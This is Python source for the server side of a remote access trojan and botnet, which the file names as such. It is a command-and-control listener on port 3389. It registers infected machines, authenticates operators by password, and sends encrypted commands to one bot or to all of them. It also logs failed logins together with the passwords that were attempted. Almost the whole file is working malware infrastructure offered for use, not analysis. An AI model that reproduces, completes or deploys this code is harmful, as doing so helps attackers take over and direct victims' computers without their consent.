# A Python RAT n' Botnet
#  by Landon in Python2
#	SERVER-SIDE C0DE

#
#Updated by a loser to Py3 and gave it some use
#

import socket, signal, hashlib, os, time, rsa, sys
import Functions
from datetime import datetime
from pytz import timezone


from cryptography.fernet import Fernet
from threading import Thread




#Fancy sleep becase fuck you
def cli_progress_test(end_val, bar_length=20):
	for i in range(0, end_val):
		percent = float(i) / end_val
		hashes = '#' * int(round(percent * bar_length))
		spaces = ' ' * (bar_length - len(hashes))
		sys.stdout.write("\rLoading please wait: [{0}] {1}%".format(hashes + spaces, int(round(percent * 100))))
		sys.stdout.flush()
		time.sleep(.5)

def hashString(str):
	return hashlib.sha512(
		str.encode()
	).digest()

def split(word):
    return [char for char in word]



def broadcast(message, fernet):
	fernet = Fernet(fernet)
	encMessage = fernet.encrypt(message.encode())
	for ip in proles:
		proles[ip].sendall(encMessage)

def clientHandler(connection, ip, privkey, password, fernet ):
	proles[ip] = connection
	message = ""
	while message != "kill":
		try:
			first = connection.recv(2048)#.split(" ", 1)

			decMessage = rsa.decrypt(first, privkey).decode()
		
			print(decMessage)
		
			message = decMessage.split(" ")

			if message[0] == "authenticate":
				if message[1] == password:
					innerParty.append(ip)
					del proles[ip]
				else:
					#print( "Attempt from : " + ip )
					f=open("logs.txt", "a+")
					f.write("Attempt from: " + ip + "on" + datetime.now(est) + "with password: " + message[1] + "\r\n")
					f.close()
				
			elif ip in innerParty:
				if message[0] == "all":
					broadcast(message[1], fernet)
				else:
					proles[message[0]].sendall(message[1])

		except:
			continue
	connection.close()
	innerParty.remove(ip)

def handler(signum, frame):
    res = input("Ctrl-c was pressed. Do you really want to exit?: ")
    if res == 'y':
        exit()
 
signal.signal(signal.SIGINT, handler)




cli_progress_test(15)
Functions.initSetup()
time.sleep(3)
public, private, passwordAdmin, passwordSecure = Functions.initCheck()

Functions.decryptKeys(passwordSecure)
key = Functions.readKeys().split(b"|||||")

readKey= rsa.PrivateKey.load_pkcs1(key[1])


print("\n\n" + public.decode())
print("\n\n\n========Awaiting commands========")
turnedOn = True

proles	  = {} # An IP to Connection dictionary.
innerParty  = [] # List of Authorized SIDs.

hostName, portNumber = "0.0.0.0" or socket.gethostname(), 3389

serverSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
serverSocket . bind(( hostName, portNumber )) # To-do: PORT CHANGE LATER
serverSocket . listen(10)
est = timezone('EST')


while turnedOn: # *Wink wink nudge nudge*
	(clientSocket, address) = serverSocket.accept()
	t = Thread(target = clientHandler, args = ( clientSocket, address[0], readKey, passwordAdmin, passwordSecure, ))
	print("\n\n")
	print( address )
	t.start()
	t.join()
